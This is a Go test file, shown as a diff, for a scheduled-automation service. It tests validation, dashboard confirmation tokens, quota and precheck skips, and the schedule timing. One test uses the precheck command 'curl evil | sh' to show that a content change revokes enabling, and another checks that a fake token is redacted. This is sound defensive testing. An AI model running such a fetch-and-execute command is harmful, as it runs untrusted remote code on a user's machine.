@@ -1,0 +1,465 @@
+package automation
+
+import (
+	"context"
+	"errors"
+	"fmt"
+	"path/filepath"
+	"strings"
+	"sync"
+	"testing"
+	"time"
+
+	"github.com/NovaSeele/Seelegent/internal/api"
+	"github.com/NovaSeele/Seelegent/internal/clock"
+	"github.com/NovaSeele/Seelegent/internal/gate"
+	"github.com/NovaSeele/Seelegent/internal/quota"
+	"github.com/NovaSeele/Seelegent/internal/store"
+	"github.com/NovaSeele/Seelegent/internal/task"
+)
+
+type fakeTasks struct {
+	mu    sync.Mutex
+	bus   *task.Bus
+	tasks map[string]*api.TaskSummary
+	reqs  []api.DelegateRequest
+	fail  error
+}
+
+func (f *fakeTasks) Bus() *task.Bus { return f.bus }
+
+func (f *fakeTasks) DelegateWith(_ context.Context, req api.DelegateRequest, sp task.Spawn) (api.TaskSummary, error) {
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	if f.fail != nil {
+		return api.TaskSummary{}, f.fail
+	}
+	id := fmt.Sprintf("t%d", len(f.tasks)+1)
+	sum := &api.TaskSummary{ID: id, Status: api.StatusRunning, AutomationID: sp.AutomationID}
+	f.tasks[id] = sum
+	f.reqs = append(f.reqs, req)
+	return *sum, nil
+}
+
+func (f *fakeTasks) Summary(_ context.Context, id string) (api.TaskSummary, error) {
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	if s := f.tasks[id]; s != nil {
+		return *s, nil
+	}
+	return api.TaskSummary{}, task.ErrNotFound
+}
+
+func (f *fakeTasks) finish(id string) {
+	f.mu.Lock()
+	f.tasks[id].Status = api.StatusDone
+	f.mu.Unlock()
+	f.bus.Publish(task.Notice{Kind: task.NoticeTask, TaskID: id})
+}
+
+func (f *fakeTasks) count() int {
+	f.mu.Lock()
+	defer f.mu.Unlock()
+	return len(f.reqs)
+}
+
+type fakeQuota struct {
+	mu   sync.Mutex
+	rows []AccountQuota
+}
+
+func (q *fakeQuota) Quota(context.Context, string, string) ([]AccountQuota, error) {
+	q.mu.Lock()
+	defer q.mu.Unlock()
+	return q.rows, nil
+}
+
+func (q *fakeQuota) set(rows ...AccountQuota) {
+	q.mu.Lock()
+	q.rows = rows
+	q.mu.Unlock()
+}
+
+type fixture struct {
+	s      *Service
+	tasks  *fakeTasks
+	quota  *fakeQuota
+	clock  *clock.Fake
+	dir    string
+	master bool
+	mu     sync.Mutex
+	pre    func(cmd string) gate.ExecResult
+	events []api.Automation
+}
+
+func newFixture(t *testing.T) *fixture {
+	t.Helper()
+	dir := t.TempDir()
+	db, err := store.Open(t.Context(), filepath.Join(dir, "seelegent.db"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = db.Close() })
+	f := &fixture{tasks: &fakeTasks{bus: task.NewBus(), tasks: map[string]*api.TaskSummary{}}, quota: &fakeQuota{},
+		clock: clock.NewFake(time.Date(2026, 11, 7, 8, 59, 30, 0, time.UTC)), dir: dir, master: true}
+	f.s = New(Options{DB: db, Tasks: f.tasks, Quota: f.quota, Clock: f.clock,
+		MasterOn: func() bool { f.mu.Lock(); defer f.mu.Unlock(); return f.master },
+		Precheck: func(_ context.Context, cmd, _ string, _ time.Duration) gate.ExecResult {
+			f.mu.Lock()
+			pre := f.pre
+			f.mu.Unlock()
+			if pre == nil {
+				code := 0
+				return gate.ExecResult{Exit: &code}
+			}
+			return pre(cmd)
+		},
+		ConfirmURL: func(id string) string { return "http://127.0.0.1:1/automations?confirm=" + id },
+		Changed: func(a api.Automation) {
+			f.mu.Lock()
+			f.events = append(f.events, a)
+			f.mu.Unlock()
+		}})
+	t.Cleanup(f.s.Close)
+	return f
+}
+
+func (f *fixture) create(t *testing.T, in api.AutomationInput) api.Automation {
+	t.Helper()
+	if in.Prompt == "" {
+		in.Prompt = "Update the changelog\nfrom the merged pull requests."
+	}
+	if in.Cwd == "" {
+		in.Cwd = f.dir
+	}
+	if in.Schedule == (api.Schedule{}) {
+		in.Schedule = api.Schedule{Every: api.EveryDaily, At: "09:00"}
+	}
+	if in.Timezone == "" {
+		in.Timezone = "UTC"
+	}
+	a, err := f.s.Create(t.Context(), in)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return a
+}
+
+// enable confirms a as the dashboard does.
+func (f *fixture) enable(t *testing.T, id string) api.Automation {
+	t.Helper()
+	tok, err := f.s.ConfirmToken(t.Context(), id)
+	if err != nil {
+		t.Fatal(err)
+	}
+	a, err := f.s.Confirm(t.Context(), id, tok.Token)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return a
+}
+
+func (f *fixture) runs(t *testing.T, id string) []api.AutomationRun {
+	t.Helper()
+	runs, err := f.s.Runs(t.Context(), id, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	return runs
+}
+
+// tickAndWait ticks at the fake time and waits for the runs it started.
+func (f *fixture) tickAndWait(t *testing.T) {
+	t.Helper()
+	if err := f.s.tick(t.Context()); err != nil {
+		t.Fatal(err)
+	}
+	f.s.wg.Wait()
+}
+
+func TestCreateValidation(t *testing.T) {
+	f := newFixture(t)
+	ctx := t.Context()
+	a := f.create(t, api.AutomationInput{Enabled: true})
+	if a.Enabled || !a.EnableRequested || a.Name != "Update the changelog" || a.NextRun != "" {
+		t.Fatalf("created = %+v", a)
+	}
+	if a.Quota.MinRemaining != 20 || a.GraceMinutes != 60 || a.Schedule.At != "09:00" {
+		t.Fatalf("defaults = %+v", a)
+	}
+	bad := []api.AutomationInput{
+		{Prompt: " ", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}},
+		{Prompt: "x", Cwd: "relative", Schedule: api.Schedule{Every: api.EveryDaily}},
+		{Prompt: "x", Cwd: filepath.Join(f.dir, "missing"), Schedule: api.Schedule{Every: api.EveryDaily}},
+		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Cron: "* * *"}},
+		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}, Timezone: "Nowhere/City"},
+		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}, Backend: "gpt"},
+		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily},
+			Quota: &api.AutomationQuota{MinRemaining: 101}},
+		{Prompt: "x", Cwd: f.dir, Schedule: api.Schedule{Every: api.EveryDaily}, GraceMinutes: ptr(2000)},
+	}
+	for i, in := range bad {
+		if _, err := f.s.Create(ctx, in); !errors.Is(err, ErrInvalid) {
+			t.Errorf("case %d accepted: %v", i, err)
+		}
+	}
+	if _, err := f.s.Get(ctx, "nope"); !errors.Is(err, ErrNotFound) {
+		t.Fatalf("get missing: %v", err)
+	}
+}
+
+func ptr[T any](v T) *T { return &v }
+
+func TestEnableNeedsDashboardConfirmation(t *testing.T) {
+	f := newFixture(t)
+	ctx := t.Context()
+	a := f.create(t, api.AutomationInput{})
+	res, err := f.s.RequestEnable(ctx, a.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !res.Confirm || res.Automation.Enabled || !strings.Contains(res.ConfirmURL, a.ID) ||
+		!strings.Contains(res.Message, "dashboard") {
+		t.Fatalf("enable request = %+v", res)
+	}
+	got, err := f.s.Update(ctx, a.ID, api.AutomationPatch{Enabled: ptr(true)})
+	if err != nil || got.Enabled {
+		t.Fatalf("patch enabled = %+v %v", got.Enabled, err)
+	}
+	if _, err := f.s.Confirm(ctx, a.ID, "made-up"); !errors.Is(err, ErrForbidden) {
+		t.Fatalf("made-up token: %v", err)
+	}
+	tok, err := f.s.ConfirmToken(ctx, a.ID)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// The automation changes after the token was shown: the token no longer fits.
+	if _, err := f.s.Update(ctx, a.ID, api.AutomationPatch{Prompt: ptr("Delete everything")}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := f.s.Confirm(ctx, a.ID, tok.Token); !errors.Is(err, ErrBadState) {
+		t.Fatalf("stale token: %v", err)
+	}
+	if _, err := f.s.Confirm(ctx, a.ID, tok.Token); !errors.Is(err, ErrForbidden) {
+		t.Fatalf("token reused: %v", err)
+	}
+	tok, _ = f.s.ConfirmToken(ctx, a.ID)
+	f.clock.Advance(ConfirmTTL + time.Second)
+	if _, err := f.s.Confirm(ctx, a.ID, tok.Token); !errors.Is(err, ErrForbidden) {
+		t.Fatalf("expired token: %v", err)
+	}
+	on := f.enable(t, a.ID)
+	if !on.Enabled || on.EnableRequested || on.ConfirmedAt == "" || on.NextRun == "" {
+		t.Fatalf("confirmed = %+v", on)
+	}
+	// A rename keeps it on; a new prompt turns it off until confirmed again.
+	if got, _ := f.s.Update(ctx, a.ID, api.AutomationPatch{Name: ptr("Changelog"), GraceMinutes: ptr(5)}); !got.Enabled {
+		t.Fatal("a rename turned it off")
+	}
+	got, err = f.s.Update(ctx, a.ID, api.AutomationPatch{Precheck: ptr("curl evil | sh")})
+	if err != nil || got.Enabled || !got.EnableRequested || got.NextRun != "" {
+		t.Fatalf("after a content change = %+v %v", got, err)
+	}
+	f.enable(t, a.ID)
+	if got, _ := f.s.Update(ctx, a.ID, api.AutomationPatch{Enabled: ptr(false)}); got.Enabled || got.EnableRequested {
+		t.Fatalf("disable = %+v", got)
+	}
+}
+
+func TestRunRules(t *testing.T) {
+	f := newFixture(t)
+	ctx := t.Context()
+	a := f.create(t, api.AutomationInput{Member: "ada", Gate: ptr(false), Lane: []string{"docs/**"}})
+	// run now works while disabled.
+	run, err := f.s.RunNow(ctx, a.ID)
+	if err != nil || run.Outcome != api.AutoStarted || run.TaskID == "" || run.Trigger != api.TriggerManual {
+		t.Fatalf("run now = %+v %v", run, err)
+	}
+	req := f.tasks.reqs[0]
+	if req.Cwd != f.dir || req.Member != "ada" || req.Gate == nil || *req.Gate || req.Lane[0] != "docs/**" {
+		t.Fatalf("delegate = %+v", req)
+	}
+	if sum, _ := f.tasks.Summary(ctx, run.TaskID); sum.AutomationID != a.ID {
+		t.Fatalf("task automation = %q", sum.AutomationID)
+	}
+	if got, _ := f.s.Get(ctx, a.ID); !got.Running || got.ActiveTaskID != run.TaskID {
+		t.Fatalf("running = %+v", got)
+	}
+	run, _ = f.s.RunNow(ctx, a.ID)
+	if run.Outcome != api.AutoSkippedOverlap || !strings.Contains(run.Detail, "still") {
+		t.Fatalf("overlap = %+v", run)
+	}
+	f.tasks.finish("t1")
+
+	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.1}}},
+		AccountQuota{AccountID: "acc2", Windows: []quota.Window{{Window: "5h", Remaining: 0.15}}})
+	run, _ = f.s.RunNow(ctx, a.ID)
+	if run.Outcome != api.AutoSkippedQuota || !strings.Contains(run.Detail, "15%") {
+		t.Fatalf("quota = %+v", run)
+	}
+	// A window past its reset counts as full.
+	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.1,
+		ResetAt: f.clock.Now().Add(-time.Minute)}}})
+	f.mu.Lock()
+	f.pre = func(cmd string) gate.ExecResult {
+		code := 1
+		return gate.ExecResult{Exit: &code, Tail: "nothing new; token=ghp_abcdefghijklmnopqrstuvwxyz0123456789"}
+	}
+	f.mu.Unlock()
+	_, _ = f.s.Update(ctx, a.ID, api.AutomationPatch{Precheck: ptr("git log -1")})
+	run, _ = f.s.RunNow(ctx, a.ID)
+	if run.Outcome != api.AutoSkippedPrecheck || !strings.Contains(run.Detail, "exit code 1") ||
+		strings.Contains(run.Detail, "ghp_abc") {
+		t.Fatalf("precheck = %+v", run)
+	}
+	f.mu.Lock()
+	f.pre = func(string) gate.ExecResult { return gate.ExecResult{TimedOut: true, Err: "timeout after 1m0s"} }
+	f.mu.Unlock()
+	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoSkippedPrecheck || !strings.Contains(run.Detail, "timed out") {
+		t.Fatalf("precheck timeout = %+v", run)
+	}
+	f.mu.Lock()
+	f.pre = nil
+	f.mu.Unlock()
+	f.tasks.fail = errors.New("no usable account")
+	if run, _ = f.s.RunNow(ctx, a.ID); run.Outcome != api.AutoError || run.Detail != "no usable account" {
+		t.Fatalf("error = %+v", run)
+	}
+	runs := f.runs(t, a.ID)
+	if len(runs) != 6 || runs[0].Outcome != api.AutoError || runs[5].Outcome != api.AutoStarted {
+		t.Fatalf("history = %+v", runs)
+	}
+	if err := f.s.Delete(ctx, a.ID); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := f.s.Runs(ctx, a.ID, 0); !errors.Is(err, ErrNotFound) {
+		t.Fatalf("runs after delete: %v", err)
+	}
+}
+
+func TestScheduleTicks(t *testing.T) {
+	f := newFixture(t)
+	a := f.create(t, api.AutomationInput{GraceMinutes: ptr(30)})
+	f.enable(t, a.ID)
+	got, _ := f.s.Get(t.Context(), a.ID)
+	if got.NextRun != "2026-11-07T09:00:00.000Z" {
+		t.Fatalf("next run = %s", got.NextRun)
+	}
+	f.tickAndWait(t)
+	if f.tasks.count() != 0 {
+		t.Fatal("ran early")
+	}
+	f.clock.Advance(40 * time.Second)
+	f.tickAndWait(t)
+	runs := f.runs(t, a.ID)
+	if len(runs) != 1 || runs[0].Trigger != api.TriggerSchedule || runs[0].Outcome != api.AutoStarted {
+		t.Fatalf("runs = %+v", runs)
+	}
+	got, _ = f.s.Get(t.Context(), a.ID)
+	if got.NextRun != "2026-11-08T09:00:00.000Z" {
+		t.Fatalf("next run = %s", got.NextRun)
+	}
+	f.tasks.finish("t1")
+
+	// The daemon was off: 20 minutes late is within the grace window (missed), 2 hours is not (skipped_late).
+	f.clock.Advance(24*time.Hour + 20*time.Minute)
+	f.tickAndWait(t)
+	if runs = f.runs(t, a.ID); runs[0].Trigger != api.TriggerMissed || runs[0].Outcome != api.AutoStarted {
+		t.Fatalf("missed run = %+v", runs[0])
+	}
+	f.tasks.finish("t2")
+	f.clock.Advance(24*time.Hour + 2*time.Hour)
+	f.tickAndWait(t)
+	if runs = f.runs(t, a.ID); runs[0].Outcome != api.AutoSkippedLate || f.tasks.count() != 2 {
+		t.Fatalf("late run = %+v", runs[0])
+	}
+	// The master switch off: the schedule moves on, nothing runs or is recorded.
+	f.mu.Lock()
+	f.master = false
+	f.mu.Unlock()
+	f.clock.Advance(24 * time.Hour)
+	f.tickAndWait(t)
+	if n := len(f.runs(t, a.ID)); n != 3 || f.tasks.count() != 2 {
+		t.Fatalf("ran with the master switch off: %d runs", n)
+	}
+}
+
+func TestBeforeReset(t *testing.T) {
+	f := newFixture(t)
+	a := f.create(t, api.AutomationInput{Schedule: api.Schedule{Every: api.EveryWeekly},
+		Quota: &api.AutomationQuota{MinRemaining: 50, UseBeforeReset: true}})
+	f.enable(t, a.ID)
+	reset := f.clock.Now().Add(10 * time.Hour)
+	// The 5 h window is low, the weekly one about to reset has 45 % left: judged on the weekly bucket (D9), 45 %
+	// is under minRemaining 50, so the run is skipped and the bucket stays unused.
+	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.9},
+		{Window: "weekly", Remaining: 0.45, ResetAt: reset}}})
+	f.tickAndWait(t)
+	runs := f.runs(t, a.ID)
+	if len(runs) != 1 || runs[0].Trigger != api.TriggerBeforeReset || runs[0].Outcome != api.AutoSkippedQuota {
+		t.Fatalf("runs = %+v", runs)
+	}
+	// Not tried again at once.
+	f.clock.Advance(time.Minute)
+	f.tickAndWait(t)
+	if n := len(f.runs(t, a.ID)); n != 1 {
+		t.Fatalf("retried at once: %d runs", n)
+	}
+	// Later, with more left, it runs once for this bucket.
+	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "5h", Remaining: 0.9},
+		{Window: "weekly", Remaining: 0.7, ResetAt: reset}}})
+	f.clock.Advance(beforeResetRetry)
+	f.tickAndWait(t)
+	if runs = f.runs(t, a.ID); runs[0].Outcome != api.AutoStarted || runs[0].Trigger != api.TriggerBeforeReset {
+		t.Fatalf("before reset = %+v", runs[0])
+	}
+	f.tasks.finish("t1")
+	f.clock.Advance(time.Hour)
+	f.tickAndWait(t)
+	if f.tasks.count() != 1 {
+		t.Fatal("ran twice for one bucket")
+	}
+	// A bucket that resets in more than 24 h, or with under 40 % left, does not count.
+	f.quota.set(AccountQuota{AccountID: "acc1", Windows: []quota.Window{{Window: "weekly", Remaining: 0.9,
+		ResetAt: f.clock.Now().Add(30 * time.Hour)}}})
+	f.tickAndWait(t)
+	if f.tasks.count() != 1 {
+		t.Fatal("ran for a far reset")
+	}
+}
+
+func TestSchedulerLoop(t *testing.T) {
+	f := newFixture(t)
+	a := f.create(t, api.AutomationInput{})
+	f.enable(t, a.ID)
+	if err := f.s.Start(t.Context()); err != nil {
+		t.Fatal(err)
+	}
+	if !f.clock.WaitTimers(1, 5*time.Second) {
+		t.Fatal("no timer armed")
+	}
+	f.clock.Advance(31 * time.Second) // 09:00:01
+	deadline := time.Now().Add(5 * time.Second)
+	for f.tasks.count() == 0 {
+		if time.Now().After(deadline) {
+			t.Fatal("the loop did not run the automation")
+		}
+		time.Sleep(10 * time.Millisecond)
+	}
+}
+
+func TestPreview(t *testing.T) {
+	f := newFixture(t)
+	p, err := f.s.Preview(api.SchedulePreviewRequest{Schedule: api.Schedule{Every: api.EveryWeekdays, At: "09:00"},
+		Timezone: "Asia/Tokyo", Count: 3})
+	if err != nil {
+		t.Fatal(err)
+	}
+	want := []string{"2026-11-09T00:00:00.000Z", "2026-11-10T00:00:00.000Z", "2026-11-11T00:00:00.000Z"}
+	if strings.Join(p.Runs, ",") != strings.Join(want, ",") || !strings.HasPrefix(p.Local[0], "2026-11-09 09:00 Mon") {
+		t.Fatalf("preview = %+v", p)
+	}
+	if _, err := f.s.Preview(api.SchedulePreviewRequest{Schedule: api.Schedule{Cron: "bad"}}); !errors.Is(err, ErrInvalid) {
+		t.Fatalf("bad cron: %v", err)
+	}
+}
